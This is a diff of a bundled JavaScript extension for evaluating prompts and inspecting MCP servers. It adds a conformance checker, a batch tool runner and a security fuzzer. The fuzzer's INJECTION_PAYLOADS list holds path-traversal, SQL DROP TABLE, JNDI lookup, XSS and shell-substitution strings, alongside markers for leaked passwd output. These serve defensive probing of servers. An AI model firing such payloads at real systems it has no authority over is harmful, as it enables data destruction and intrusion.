+      return { kind: "model", header: `Model \xB7 ${a.model} vs ${b.model}` };
+    }
+    if (!samePrompt && modelChanged) {
+      return { kind: "both", header: `${a.label} \u2192 ${b.label} \xB7 prompt + model (${a.model} vs ${b.model})` };
+    }
+    if (!samePrompt) {
+      return { kind: "prompt", header: `Prompt \xB7 ${a.label} \u2192 ${b.label}` };
+    }
+    return { kind: "same", header: `${a.label} \u2192 ${b.label} \xB7 identical prompt & model` };
+  }
   function scoreToHalfWidth(score) {
     return round1(clamp(score, 0, 10) / 10 * 50);
   }
@@ -5778,6 +6283,7 @@ ${systemPrompt}`,
     if (entries.length === 0) lines.push("_No versions yet._");
     for (const e of entries) {
       lines.push(`## ${e.label}`);
+      if (e.model) lines.push(`- Model: \`${e.model}\``);
       if (e.run) {
         lines.push(
           `- Score: **${e.run.overall.toFixed(1)}/10** (${e.run.passCount}/${e.run.total} passed, ${e.run.failCount} failed)`
@@ -5846,11 +6352,18 @@ ${systemPrompt}`,
   }
 
   // src/ui/views.ts
-  function esc(s) {
-    return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
+  function esc(s2) {
+    return s2.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;");
   }
   function band(score) {
     return score >= 7.5 ? "hi" : score >= 5 ? "mid" : "lo";
+  }
+  function builderLogHtml(turns) {
+    return turns.map((t) => {
+      const chips = (t.suggestions ?? []).map((s2) => `<button class="sugg" data-fill="${esc(s2)}">${esc(s2)}</button>`).join("");
+      const chipWrap = chips ? `<div class="suggrow">${chips}</div>` : "";
+      return `<div class="bub ${t.who === "you" ? "you" : "lit"}"><div class="bub-txt">${esc(t.text)}</div>${chipWrap}</div>`;
+    }).join("");
   }
   var FACET_ICON = { language: "\u270E", intent: "\u25CE", format: "{ }", tone: "\u25D1" };
   function facetRowsHtml(facets) {
@@ -5872,6 +6385,62 @@ ${systemPrompt}`,
   function speedStripHtml(speed) {
     return `<div class="mstrip"><div><div class="mk">TTFB</div><div class="mv">${round1(speed.ttfbMs / 1e3)}s</div></div><div><div class="mk">Avg resp</div><div class="mv">${round1(speed.avgResponseMs / 1e3)}s</div></div><div><div class="mk">Tokens/s</div><div class="mv">${speed.tokensPerSec}</div></div></div>`;
   }
+  function parseJson(s2) {
+    try {
+      return JSON.parse(s2);
+    } catch {
+      return null;
+    }
+  }
+  function prop(v2, k) {
+    return typeof v2 === "object" && v2 !== null ? v2[k] : void 0;
+  }
+  function compact(v2) {
+    if (v2 === void 0 || v2 === null) return "";
+    return typeof v2 === "string" ? v2 : JSON.stringify(v2);
+  }
+  function dfield(label, body) {
+    return `<div class="dfield"><div class="dlabel">${esc(label)}</div>${body}</div>`;
+  }
+  function dtext(s2) {
+    return `<div class="dtext">${esc(s2 || "(empty)")}</div>`;
+  }
+  function trajectoryStepHtml(step, i) {
+    const text = compact(prop(step, "modelText"));
+    const calls = (Array.isArray(prop(step, "toolCalls")) ? prop(step, "toolCalls") : []).map((tc) => `<code>${esc(compact(prop(tc, "name")))}(${esc(compact(prop(tc, "arguments")))})</code>`).join(" ");
+    const results = (Array.isArray(prop(step, "toolResults")) ? prop(step, "toolResults") : []).map((tr) => `<span class="dres">\u2192 ${esc(compact(prop(tr, "result")))}</span>`).join(" ");
+    const callLine = calls ? `<div class="dcall">${calls} ${results}</div>` : "";
+    return `<div class="dstep"><span class="dstepn">${i + 1}</span><div>${text ? dtext(text) : ""}${callLine}</div></div>`;
+  }
+  function caseDetailHtml(r, c) {
+    const parts = [dfield("Question", dtext(c?.input ?? r.caseId))];
+    if (c?.scenario) {
+      const traj = parseJson(r.output);
+      const steps = Array.isArray(prop(traj, "steps")) ? prop(traj, "steps") : [];
+      parts.push(dfield("Trajectory", steps.length ? steps.map(trajectoryStepHtml).join("") : dtext("No steps.")));
+      const final = compact(prop(traj, "finalText"));
+      if (final) parts.push(dfield("Final answer", dtext(final)));
+    } else if (c?.toolExpectations) {
+      const calls = parseJson(r.output);
+      const list = Array.isArray(calls) && calls.length ? calls.map((tc) => `<div class="dcall"><code>${esc(compact(prop(tc, "name")))}</code> <span class="dargs">${esc(compact(prop(tc, "arguments") ?? prop(tc, "rawArguments")))}</span></div>`).join("") : dtext("No tool was called.");
+      parts.push(dfield("Tools called", list));
+      const exp = c.toolExpectations;
+      const expBits = [
+        exp.expectedTool ? `expected: ${exp.expectedTool}` : "",
+        exp.forbiddenTools?.length ? `forbidden: ${exp.forbiddenTools.join(", ")}` : "",
+        exp.requiredArgs ? `required args: ${compact(exp.requiredArgs)}` : ""
+      ].filter(Boolean).join(" \xB7 ");
+      if (expBits) parts.push(dfield("Expected", dtext(expBits)));
+    } else {
+      parts.push(dfield("Response", dtext(r.output)));
+    }
+    if (r.dimensions?.length) {
+      const dims = r.dimensions.map((d) => `<span class="ddim">${esc(d.dimension)} ${d.score.toFixed(1)}</span>`).join("");
+      parts.push(dfield("Dimensions", `<div class="ddims">${dims}</div>`));
+    }
+    parts.push(dfield("Why", dtext(r.rationale)));
+    return `<div class="mdetail hidden">${parts.join("")}</div>`;
+  }
   function resultsTableHtml(results, threshold, cases = []) {
     const byId = new Map(cases.map((c) => [c.id, c]));
     const ordered = failingFirst(results, threshold);
@@ -5888,7 +6457,7 @@ ${c?.input ?? ""}
 \u2014 ${r.rationale}`.trim();
       const idTag = `<span class="cid">${esc(r.caseId)}</span>`;
       const spread = r.samples ? r.samples.min === r.samples.max ? `<span class="spread">\xD7${r.samples.count}</span>` : `<span class="spread">${r.samples.min}\u2013${r.samples.max}</span>` : "";
-      return `<div class="mrow"><div class="cse" title="${esc(tip)}">${idTag}${esc(detail)}</div><div class="cell ${b === "lo" ? "lo" : "ok"}">${r.score.toFixed(1)}${spread}</div><div class="cell">${mark}</div></div>`;
+      return `<div class="mrow" data-cid="${esc(r.caseId)}" title="${esc(tip)}"><div class="cse"><span class="caret">\u25B8</span>${idTag}${esc(detail)}</div><div class="cell ${b === "lo" ? "lo" : "ok"}">${r.score.toFixed(1)}${spread}</div><div class="cell">${mark}</div></div>` + caseDetailHtml(r, c);
     }).join("");
     return `<div class="matrix"><div class="mhead"><div>Case</div><div>Score</div><div>P/F</div></div>${rows}</div>`;
   }
@@ -5918,22 +6487,640 @@ ${c?.input ?? ""}
   }
   function versionsTimelineHtml(items) {
     if (items.length === 0) return '<p class="sub">No versions yet \u2014 run the loop to save v1.</p>';
-    const rows = items.map((v) => {
-      const deltaHtml = v.delta === null ? '<span class="vd flat">baseline</span>' : `<span class="vd ${v.delta >= 0 ? "up" : "down"}">${v.delta >= 0 ? "\u25B2 +" : "\u25BC "}${Math.abs(v.delta).toFixed(1)}</span>`;
-      const cur = v.current ? '<span class="vcur">current</span>' : "";
-      return `<div class="ver${v.delta === null ? " base" : ""}"><div class="vh"><span class="vt">${esc(v.label)}</span>${cur}${deltaHtml}<span class="vsc">${v.overall.toFixed(1)} \xB7 ${esc(v.passLabel)} \xB7 ${v.avgSeconds}s</span></div><div class="vnote">${esc(v.note)}</div></div>`;
+    const rows = items.map((v2) => {
+      const deltaHtml = v2.delta === null ? '<span class="vd flat">baseline</span>' : `<span class="vd ${v2.delta >= 0 ? "up" : "down"}">${v2.delta >= 0 ? "\u25B2 +" : "\u25BC "}${Math.abs(v2.delta).toFixed(1)}</span>`;
+      const cur = v2.current ? '<span class="vcur">current</span>' : "";
+      const model = v2.model ? `<span class="vmodel" title="ran on ${esc(v2.model)}">${esc(v2.model)}</span>` : "";
+      return `<div class="ver${v2.delta === null ? " base" : ""}"><div class="vh"><span class="vt">${esc(v2.label)}</span>${cur}${model}${deltaHtml}<span class="vsc">${v2.overall.toFixed(1)} \xB7 ${esc(v2.passLabel)} \xB7 ${v2.avgSeconds}s</span></div><div class="vnote">${esc(v2.note)}</div></div>`;
     }).join("");
     return `<div class="vtl">${rows}</div>`;
   }
 
+  // src/platform/hostPermission.ts
+  function originPatternFor(url) {
+    const u = new URL(url);
+    return `${u.protocol}//${u.host}/*`;
+  }
+  function defaultApi() {
+    return chrome.permissions;
+  }
+  async function ensureHostPermission(url, api = defaultApi()) {
+    const origins = [originPatternFor(url)];
+    if (await api.contains({ origins })) return true;
+    return api.request({ origins });
+  }
+
+  // src/mcp/conformance.ts
+  function checkToolSchema(tool) {
+    const out = [];
+    const s2 = tool.inputSchema;
+    const type = s2["type"];
+    if (type !== void 0 && type !== "object") {
+      out.push({ level: "warn", check: `tool:${tool.name}`, detail: `inputSchema.type is "${String(type)}", expected "object"` });
+    }
+    const hasProps = typeof s2["properties"] === "object" && s2["properties"] !== null;
+    const required = s2["required"];
+    if (Array.isArray(required)) {
+      const props = hasProps ? s2["properties"] : {};
+      for (const key of required) {
+        if (typeof key === "string" && hasProps && !(key in props)) {
+          out.push({ level: "warn", check: `tool:${tool.name}`, detail: `required "${key}" is not defined in properties` });
+        }
+      }
+    }
+    if (!tool.description) {
+      out.push({ level: "warn", check: `tool:${tool.name}`, detail: "tool has no description (hurts model tool selection)" });
+    }
+    if (out.length === 0) out.push({ level: "pass", check: `tool:${tool.name}`, detail: "schema looks well-formed" });
+    return out;
+  }
+  async function runConformance(client) {
+    const findings = [];
+    let handshake;
+    try {
+      handshake = await client.connect();
+    } catch (err) {
+      findings.push({ level: "fail", check: "handshake", detail: `initialize failed: ${msg(err)}` });
+      return { ok: false, toolCount: 0, resourceCount: 0, promptCount: 0, findings };
+    }
+    findings.push({ level: "pass", check: "handshake", detail: `connected to ${handshake.serverInfo.name} ${handshake.serverInfo.version}` });
+    findings.push(versionFinding(handshake.protocolVersion));
+    const { count: toolCount, items: tools } = await listSafely(findings, "tools", handshake.capabilities.tools, () => client.listTools());
+    for (const t of tools ?? []) findings.push(...checkToolSchema(t));
+    const { count: resourceCount } = await listSafely(findings, "resources", handshake.capabilities.resources, () => client.listResources());
+    const { count: promptCount } = await listSafely(findings, "prompts", handshake.capabilities.prompts, () => client.listPrompts());
+    const ok = !findings.some((f) => f.level === "fail");
+    return { ok, handshake, toolCount, resourceCount, promptCount, findings };
+  }
+  function versionFinding(serverVersion) {
+    if (serverVersion === CLIENT_PROTOCOL_VERSION) {
+      return { level: "pass", check: "version", detail: `protocol ${serverVersion} matches client` };
+    }
+    return { level: "warn", check: "version", detail: `server negotiated ${serverVersion}; client requested ${CLIENT_PROTOCOL_VERSION}` };
+  }
+  async function listSafely(findings, name, advertised, list) {
+    try {
+      const items = await list();
+      if (!advertised && items.length > 0) {
+        findings.push({ level: "warn", check: name, detail: `${items.length} ${name} returned though capability was not advertised` });
+      } else {
+        findings.push({ level: "pass", check: name, detail: `${items.length} ${name} listed` });
+      }
+      return { count: items.length, items };
+    } catch (err) {
+      if (advertised) {
+        findings.push({ level: "fail", check: name, detail: `${name} advertised but ${name}/list failed: ${msg(err)}` });
+      }
+      return { count: 0 };
+    }
+  }
+  function msg(err) {
+    return err instanceof Error ? err.message : String(err);
+  }
+
+  // src/mcp/security.ts
+  var INJECTION_PAYLOADS = [
+    "../../../../etc/passwd",
+    "'; DROP TABLE users;--",
+    "${jndi:ldap://example.invalid/x}",
+    "<script>alert(1)<\/script>",
+    "$(id)"
+  ];
+  var LEAK_MARKERS = ["root:x:0:0", "uid=", "/bin/bash", "NT AUTHORITY"];
+  function properties(tool) {
+    const p = tool.inputSchema["properties"];
+    return typeof p === "object" && p !== null ? p : {};
+  }
+  function requiredKeys(tool) {
+    const r = tool.inputSchema["required"];
+    return Array.isArray(r) ? r.filter((k) => typeof k === "string") : [];
+  }
+  function sampleValue(type) {
+    switch (type) {
+      case "number":
+      case "integer":
+        return 1;
+      case "boolean":
+        return true;
+      case "array":
+        return [];
+      case "object":
+        return {};
+      default:
+        return "sample";
+    }
+  }
+  function wrongValue(type) {
+    return type === "string" ? 12345 : "not-the-right-type";
+  }
+  function baselineArgs(props) {
+    const args = {};
+    for (const [k, spec] of Object.entries(props)) args[k] = sampleValue(spec.type);
+    return args;
+  }
+  function generateProbes(tool) {
+    const props = properties(tool);
+    const required = requiredKeys(tool);
+    const base = baselineArgs(props);
+    const probes = [];
+    const notes = [];
+    probes.push({ kind: "empty-args", toolName: tool.name, args: {}, description: "no arguments supplied" });
+    for (const key of required) {
+      const args = { ...base };
+      delete args[key];
+      probes.push({ kind: "missing-required", toolName: tool.name, args, description: `omits required "${key}"` });
+    }
+    for (const [key, spec] of Object.entries(props)) {
+      probes.push({
+        kind: "type-fuzz",
+        toolName: tool.name,
+        args: { ...base, [key]: wrongValue(spec.type) },
+        description: `wrong type for "${key}" (declared ${spec.type ?? "string"})`
+      });
+    }
+    const stringKeys = Object.entries(props).filter(([, s2]) => (s2.type ?? "string") === "string").map(([k]) => k);
+    const target = stringKeys[0];
+    if (target) {
+      probes.push({
+        kind: "oversized",
+        toolName: tool.name,
+        args: { ...base, [target]: "A".repeat(1e5) },
+        description: `oversized 100k-char value for "${target}"`
+      });
+      for (const payload of INJECTION_PAYLOADS) {
+        probes.push({
+          kind: "injection",
+          toolName: tool.name,
+          args: { ...base, [target]: payload },
+          description: `injection payload in "${target}": ${payload.slice(0, 24)}`,
+          payload
+        });
+      }
+      if (stringKeys.length > 1) notes.push(`${tool.name}: injection probes applied to "${target}" only (${stringKeys.length - 1} other string field(s) not fuzzed)`);
+    } else {
+      notes.push(`${tool.name}: no string input \u2014 injection/oversized probes skipped`);
+    }
+    return { probes, notes };
+  }
+  function classifyOutcome(probe, outcome) {
+    if (!outcome.ok) {
+      return { probe, classification: "server-error", severity: "medium", detail: `transport/RPC error: ${outcome.error}` };
+    }
+    const { result } = outcome;
+    if (probe.kind === "injection") {
+      const leaked = LEAK_MARKERS.find((m) => result.text.includes(m));
+      if (!result.isError && leaked) {
+        return { probe, classification: "possible-leak", severity: "high", detail: `output contains sensitive marker "${leaked}"` };
+      }
+      if (!result.isError && probe.payload && result.text.includes(probe.payload)) {
+        return { probe, classification: "possible-leak", severity: "medium", detail: "payload reflected verbatim in output" };
+      }
+      return result.isError ? { probe, classification: "rejected", severity: "low", detail: "server rejected the injection input" } : { probe, classification: "rejected", severity: "low", detail: "no leak detected in output" };
+    }
+    if (result.isError) {
+      return { probe, classification: "rejected", severity: "low", detail: "server rejected the malformed input" };
+    }
+    return { probe, classification: "accepted-invalid", severity: "medium", detail: "server accepted schema-violating input without error" };
+  }
+  var EMPTY_COUNTS = { rejected: 0, "accepted-invalid": 0, "server-error": 0, "possible-leak": 0 };
+  async function runSecurityScan(caller, tools) {
+    const findings = [];
+    const notes = [];
+    const counts = { ...EMPTY_COUNTS };
+    for (const tool of tools) {
+      const { probes, notes: toolNotes } = generateProbes(tool);
+      notes.push(...toolNotes);
+      for (const probe of probes) {
+        const outcome = await runProbe(caller, probe);
+        const finding = classifyOutcome(probe, outcome);
+        findings.push(finding);
+        counts[finding.classification] += 1;
+      }
+    }
+    return { findings, counts, notes };
+  }
+  async function runProbe(caller, probe) {
+    try {
+      return { ok: true, result: await caller.callTool(probe.toolName, probe.args) };
+    } catch (err) {
+      return { ok: false, error: err instanceof Error ? err.message : String(err) };
+    }
+  }
+
+  // src/ui/mcpView.ts
+  function connectionBarHtml(state2, handshake, message) {
+    const dot = `<span class="mcp-dot ${state2}"></span>`;
+    if (state2 === "connected" && handshake) {
+      const h = handshake;
+      return `<div class="mcp-bar connected">${dot}<span class="mcp-id"><strong>${esc(h.serverInfo.name)}</strong> ${esc(h.serverInfo.version)} \xB7 ${esc(h.protocolVersion)}</span><span class="mcp-live">\u26A0 live</span><button class="mcp-edit" id="mcpEditBtn" type="button">edit</button></div>`;
+    }
+    const label = state2 === "connecting" ? "Connecting\u2026" : state2 === "error" ? esc(message ?? "Connection failed") : "Not connected";
+    return `<div class="mcp-bar ${state2}">${dot}<span class="mcp-id">${label}</span>` + (state2 === "connecting" ? '<span class="spinner sm"></span>' : "") + (state2 === "error" ? '<button class="mcp-edit" id="mcpEditBtn" type="button">retry</button>' : "") + "</div>";
+  }
+  function capabilitiesHtml(report) {
+    if (!report.handshake) return '<div class="mcp-err">Not connected.</div>';
+    const h = report.handshake;
+    const caps = [
+      h.capabilities.tools ? `tools (${report.toolCount})` : "",
+      h.capabilities.resources ? `resources (${report.resourceCount})` : "",
+      h.capabilities.prompts ? `prompts (${report.promptCount})` : ""
+    ].filter(Boolean);
+    return `<div class="mcp-server"><strong>${esc(h.serverInfo.name)}</strong> ${esc(h.serverInfo.version)} \xB7 protocol ${esc(h.protocolVersion)}</div><div class="mcp-caps">${caps.length ? caps.map((c) => `<span class="mcp-chip">${esc(c)}</span>`).join("") : "<em>no capabilities advertised</em>"}</div>`;
+  }
+  function findingsHtml(findings) {
+    const order = { fail: 0, warn: 1, pass: 2 };
+    const sorted = [...findings].sort((a, b) => order[a.level] - order[b.level]);
+    const rows = sorted.map((f) => `<li class="mcp-find ${f.level}"><span class="lvl">${f.level}</span> <span class="chk">${esc(f.check)}</span> ${esc(f.detail)}</li>`).join("");
+    return `<ul class="mcp-findings">${rows}</ul>`;
+  }
+  function conformancePillHtml(report) {
+    const counts = report.findings.reduce(
+      (a, f) => (a[f.level] += 1, a),
+      { fail: 0, warn: 0, pass: 0 }
+    );
+    const bits = [
+      counts.fail ? `${counts.fail} fail` : "",
+      counts.warn ? `${counts.warn} warn` : "",
+      `${counts.pass} pass`
+    ].filter(Boolean);
+    const open = counts.fail > 0 ? " open" : "";
+    return `<details class="mcp-disc"${open}><summary>Conformance \xB7 ${bits.join(" \xB7 ")}</summary>` + findingsHtml(report.findings) + `</details>`;
+  }
+  function toolListHtml(tools) {
+    if (tools.length === 0) return '<div class="mcp-empty">No tools exposed.</div>';
+    return '<ul class="mcp-tools">' + tools.map(
+      (t) => `<li class="mcp-tool" data-tool="${esc(t.name)}"><code>${esc(t.name)}</code>` + (t.description ? ` \u2014 ${esc(t.description)}` : "") + `</li>`
+    ).join("") + "</ul>";
+  }
+  var MAX_BATCH = 10;
+  var BATCH_CONCURRENCY = 5;
+  function propsOf(tool) {
+    const p = tool.inputSchema["properties"];
+    return typeof p === "object" && p !== null ? p : {};
+  }
+  function requiredOf(tool) {
+    const r = tool.inputSchema["required"];
+    return Array.isArray(r) ? r.filter((k) => typeof k === "string") : [];
+  }
+  function stringFieldsOf(tool) {
+    return Object.entries(propsOf(tool)).filter(([, s2]) => (s2.type ?? "string") === "string").map(([k]) => k);
+  }
+  var CONTENT_FIELD_NAMES = ["question", "query", "prompt", "input", "text", "message", "content", "q"];
+  function batchFieldFor(tool) {
+    const strings = stringFieldsOf(tool);
+    if (strings.length === 0) return { name: "", mode: "json" };
+    const required = requiredOf(tool);
+    const byName = strings.find((k) => CONTENT_FIELD_NAMES.includes(k.toLowerCase()));
+    const reqStr = strings.find((k) => required.includes(k));
+    return { name: byName ?? reqStr ?? strings[0], mode: "value" };
+  }
+  function fieldFor(key, spec, required) {
+    const label = `<label class="mcp-flabel">${esc(key)}${required ? '<span class="req">\u25CF</span>' : ""}</label>`;
+    const da = `data-arg="${esc(key)}"`;
+    if (Array.isArray(spec.enum)) {
+      const opts = spec.enum.map((v2) => `<option value="${esc(String(v2))}">${esc(String(v2))}</option>`).join("");
+      return `${label}<div class="select"><span class="sl"><span class="pv">\u25BE</span><select ${da} data-type="enum">${opts}</select></span></div>`;
+    }
+    const t = spec.type ?? "string";
+    if (t === "boolean") {
+      return `${label}<label class="mcp-toggle"><input type="checkbox" ${da} data-type="boolean" /> <span>true / false</span></label>`;
+    }
+    if (t === "number" || t === "integer") {
+      return `${label}<input class="field mono" type="number" ${da} data-type="number" placeholder="0" />`;
+    }
+    if (t === "string") {
+      return `${label}<input class="field mono" ${da} data-type="string" placeholder="${esc(spec.description ?? "")}" />`;
+    }
+    return `${label}<input class="field mono" ${da} data-type="json" placeholder='JSON, e.g. {"k":1}' />`;
+  }
+  function toolFormHtml(tool) {
+    const props = typeof tool.inputSchema["properties"] === "object" && tool.inputSchema["properties"] !== null ? tool.inputSchema["properties"] : {};
+    const required = new Set(Array.isArray(tool.inputSchema["required"]) ? tool.inputSchema["required"] : []);
+    const fields = Object.entries(props).map(([k, spec]) => `<div class="mcp-field">${fieldFor(k, spec, required.has(k))}</div>`).join("");
+    const body = fields || '<div class="mcp-empty">No declared parameters.</div>';
+    const batch = batchFieldFor(tool);
+    const strings = stringFieldsOf(tool);
+    const batchSelector = batch.mode === "value" && strings.length > 1 ? `<div class="dlabel">Vary field (other args come from the form above)</div><div class="select"><span class="sl"><span class="pv">\u25BE</span><select id="mcpBatchField">` + strings.map((k) => `<option value="${esc(k)}"${k === batch.name ? " selected" : ""}>${esc(k)}</option>`).join("") + `</select></span></div>` : "";
+    const batchLabel = batch.mode === "json" ? `One JSON args object per line \xB7 up to ${MAX_BATCH}, ${BATCH_CONCURRENCY} at a time` : strings.length > 1 ? `Each line fills the chosen field; fill the other args in the form above \xB7 up to ${MAX_BATCH}, ${BATCH_CONCURRENCY} at a time` : `One "${esc(batch.name)}" per line \xB7 up to ${MAX_BATCH}, ${BATCH_CONCURRENCY} at a time`;
+    const batchPlaceholder = batch.mode === "value" ? `what is the purpose of this repo?
+what language is it written in?` : `{"city":"Paris"}
+{"city":"Tokyo"}`;
+    return `<div class="mcp-form" data-tool="${esc(tool.name)}"><div class="mcp-formhead"><code>${esc(tool.name)}</code><button class="mcp-rawtoggle" id="mcpRawToggle" type="button">{ } raw</button></div><div class="mcp-fields" id="mcpFields">${body}</div><textarea class="field mono mcp-rawbox hidden" id="mcpRawBox" spellcheck="false" placeholder='{"arg":"value"}'></textarea><p class="varnote">\u26A0 Live call \u2014 real side effects on the server.</p><button class="btn ghost block" id="mcpCallBtn" data-tool="${esc(tool.name)}">\u25B6 Call ${esc(tool.name)}</button><div id="mcpToolResult"></div><details class="mcp-disc mcp-batch"><summary>Batch run</summary>` + batchSelector + `<div class="dlabel">${batchLabel}</div><textarea class="field mono" id="mcpBatchInput" spellcheck="false" placeholder="${batchPlaceholder}"></textarea><button class="btn ghost block" id="mcpBatchBtn" data-tool="${esc(tool.name)}" data-field="${esc(batch.name)}" data-mode="${batch.mode}">\u25B6 Run batch (${BATCH_CONCURRENCY} at a time)</button><div id="mcpBatchResult"></div></details></div>`;
+  }
+  function batchResultsHtml(items) {
+    if (items.length === 0) return "";
+    const fails = items.filter((i) => !i.ok).length;
+    const summary = `<div class="mcp-secsum"><span class="mcp-chip ok">${items.length - fails} ok</span>${fails ? `<span class="mcp-chip high">${fails} failed</span>` : ""}</div>`;
+    const rows = items.map((it) => {
+      const open = it.ok ? "" : " open";
+      return `<details class="mcp-disc"${open}><summary class="${it.ok ? "" : "mcp-find high"}">${it.ok ? "\u2713" : "\u2717"} ${esc(it.input.slice(0, 80))}</summary><div class="mcp-result ${it.ok ? "mcp-ok" : "mcp-err"}"><pre>${esc(it.text)}</pre></div></details>`;
+    }).join("");
+    return summary + rows;
+  }
+  function resourcesHtml(resources) {
+    if (resources.length === 0) return '<div class="mcp-empty">No resources.</div>';
+    return '<ul class="mcp-res">' + resources.map((r) => `<li><code>${esc(r.uri)}</code>${r.name ? ` \u2014 ${esc(r.name)}` : ""}</li>`).join("") + "</ul>";
+  }
+  function promptsHtml(prompts) {
+    if (prompts.length === 0) return '<div class="mcp-empty">No prompts.</div>';
+    return '<ul class="mcp-prompts">' + prompts.map((p) => `<li><code>${esc(p.name)}</code>${p.description ? ` \u2014 ${esc(p.description)}` : ""}</li>`).join("") + "</ul>";
+  }
+  var SEV_ORDER = { high: 0, medium: 1, low: 2 };
+  function securityReportHtml(report) {
+    const c = report.counts;
+    const summary = `<div class="mcp-secsum"><span class="mcp-chip high">${c["possible-leak"]} possible leak</span><span class="mcp-chip med">${c["accepted-invalid"]} accepted-invalid</span><span class="mcp-chip med">${c["server-error"]} server-error</span><span class="mcp-chip ok">${c.rejected} rejected</span></div>`;
+    const notable = report.findings.filter((f) => f.classification !== "rejected").sort((a, b) => SEV_ORDER[a.severity] - SEV_ORDER[b.severity]);
+    if (notable.length === 0) {
+      return summary + '<div class="mcp-ok">No issues found \u2014 every adversarial probe was rejected.</div>';
+    }
+    const rows = notable.map(
+      (f) => `<li class="mcp-find ${f.severity}"><span class="lvl">${f.severity}</span> <code>${esc(f.probe.toolName)}</code> <span class="chk">${esc(f.probe.kind)}</span> ${esc(f.detail)} <em>(${esc(f.probe.description)})</em></li>`
+    ).join("");
+    const open = notable.some((f) => f.severity === "high") ? " open" : "";
+    const notes = report.notes.length ? `<div class="mcp-notes">${report.notes.map((n) => esc(n)).join("<br>")}</div>` : "";
+    return summary + `<details class="mcp-disc"${open}><summary>${notable.length} notable finding(s)</summary><ul class="mcp-findings">${rows}</ul>${notes}</details>`;
+  }
+
+  // src/ui/mcpPanel.ts
+  var area = chromeLocal();
+  var s = { conn: "disconnected", tools: [], resources: [], prompts: [], cat: "tools", scanned: false };
+  var onBack = () => {
+  };
+  var $ = (id) => document.getElementById(id);
+  var v = (id) => $(id)?.value.trim() ?? "";
+  var setHtml = (id, html2) => {
+    const e = $(id);
+    if (e) e.innerHTML = html2;
+  };
+  var status = (msg2, kind = "info") => {
+    const e = $("mcpStatus");
+    if (e) {
+      e.textContent = msg2;
+      e.dataset["kind"] = kind;
+    }
+  };
+  function setConn(conn, message) {
+    s.conn = conn;
+    setHtml("mcpBar", connectionBarHtml(conn, s.handshake, message));
+    $("mcpEditBtn")?.addEventListener("click", () => toStage1());
+    const connected = conn === "connected";
+    $("mcpConnect")?.classList.toggle("hidden", connected);
+    $("mcpInspect")?.classList.toggle("hidden", !connected);
+  }
+  function toStage1() {
+    s.client = void 0;
+    s.handshake = void 0;
+    setConn("disconnected");
+    status("");
+  }
+  function readConfig() {
+    const transport = $("mcpTransport")?.value ?? "http";
+    const authHeader = v("mcpAuth");
+    return McpServerConfigSchema.parse({
+      id: "s1",
+      name: v("mcpName") || "server",
+      url: v("mcpUrl"),
+      transport,
+      ...authHeader ? { authHeader } : {}
+    });
+  }
+  async function onConnect() {
+    let config;
+    try {
+      config = readConfig();
+    } catch {
+      status("Enter a valid server URL first.", "error");
+      return;
+    }
+    if (!await ensureHostPermission(config.url)) {
+      setConn("error", "Host permission denied");
+      return;
+    }
+    const settings = await loadSettings(area);
+    await saveSettings(area, { ...settings, mcpServers: [config] });
+    setConn("connecting");
+    try {
+      const client = connectMcp(config);
+      const report = await runConformance(client);
+      if (!report.handshake) {
+        const fail = report.findings.find((f) => f.level === "fail");
+        setConn("error", fail?.detail ?? "handshake failed");
+        return;
+      }
+      const caps = report.handshake.capabilities;
+      s.client = client;
+      s.handshake = report.handshake;
+      s.tools = caps?.tools ? await client.listTools() : [];
+      s.resources = caps?.resources ? await client.listResources() : [];
+      s.prompts = caps?.prompts ? await client.listPrompts() : [];
+      s.scanned = false;
+      setConn("connected");
+      setHtml("mcpCaps", capabilitiesHtml(report));
+      setHtml("mcpConformance", conformancePillHtml(report));
+      setHtml("mcpSecurity", "");
+      s.cat = "tools";
+      renderTabs();
+      renderCatalog();
+      status(report.ok ? "Connected \u2014 conformance passed." : "Connected, with conformance findings.");
+    } catch (err) {
+      s.tools = [];
+      s.resources = [];
+      s.prompts = [];
+      setConn("error", err instanceof Error ? err.message : String(err));
+    }
+  }
+  function renderTabs() {
+    for (const btn of Array.from(document.querySelectorAll(".mcptab"))) {
+      btn.setAttribute("aria-pressed", String(btn.dataset["cat"] === s.cat));
+    }
+  }
+  function renderCatalog() {
+    if (s.cat === "resources") return setHtml("mcpCatalog", resourcesHtml(s.resources));
+    if (s.cat === "prompts") return setHtml("mcpCatalog", promptsHtml(s.prompts));
+    setHtml("mcpCatalog", toolListHtml(s.tools));
+  }
+  function selectTool(name) {
+    const tool = s.tools.find((t) => t.name === name);
+    if (!tool) return;
+    setHtml("mcpCatalog", toolFormHtml(tool));
+    $("mcpRawToggle")?.addEventListener("click", () => {
+      $("mcpFields")?.classList.toggle("hidden");
+      $("mcpRawBox")?.classList.toggle("hidden");
+    });
+    $("mcpCallBtn")?.addEventListener("click", () => void onCall(name));
+    $("mcpBatchBtn")?.addEventListener("click", (e) => void onBatch(name, e.currentTarget));
+  }
+  function batchArgs(line, field, mode) {
+    if (mode === "json" || line.startsWith("{")) return JSON.parse(line);
+    let base = {};
+    try {
+      const read = readArgs();
+      if (read && typeof read === "object") base = read;
+    } catch {
+      base = {};
+    }
+    return { ...base, [field]: line };
+  }
+  async function onBatch(name, btn) {
+    if (!s.client) return;
+    const raw = $("mcpBatchInput")?.value ?? "";
+    let lines = raw.split("\n").map((l) => l.trim()).filter(Boolean);
+    if (lines.length === 0) {
+      setHtml("mcpBatchResult", '<div class="mcp-err">Enter at least one line.</div>');
+      return;
+    }
+    let truncated = false;
+    if (lines.length > MAX_BATCH) {
+      lines = lines.slice(0, MAX_BATCH);
+      truncated = true;
+    }
+    const field = $("mcpBatchField")?.value || btn.dataset["field"] || "";
+    const mode = btn.dataset["mode"] ?? "value";
+    setHtml("mcpBatchResult", `Running ${lines.length} call(s), ${BATCH_CONCURRENCY} at a time\u2026`);
+    const client = s.client;
+    const results = await mapWithConcurrency(lines, BATCH_CONCURRENCY, async (line) => {
+      let args;
+      try {
+        args = batchArgs(line, field, mode);
+      } catch {
+        return { input: line, ok: false, text: "invalid JSON for this line" };
+      }
+      try {
+        const res = await client.callTool(name, args);
+        return { input: line, ok: !res.isError, text: res.text || JSON.stringify(res.content) };
+      } catch (err) {
+        return { input: line, ok: false, text: err instanceof Error ? err.message : String(err) };
+      }
+    });
+    setHtml("mcpBatchResult", batchResultsHtml(results));
+    status(truncated ? `Ran ${lines.length} (capped at ${MAX_BATCH}).` : `Ran ${lines.length} call(s).`);
+  }
+  function readArgs() {
+    const raw = $("mcpRawBox");
